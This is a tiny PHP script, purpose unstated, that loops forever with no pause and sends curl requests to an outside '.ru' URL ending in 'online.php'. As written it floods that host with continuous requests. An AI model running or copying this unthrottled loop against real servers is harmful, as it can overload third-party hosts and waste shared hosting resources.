<?php
while (true){
$con= curl_init();
curl_setopt($con,CURLOPT_URL,'https://u5945.xvest2.ru/online.php');
curl_setopt($con,CURLOPT_HEADER,true);
curl_exec($con);
}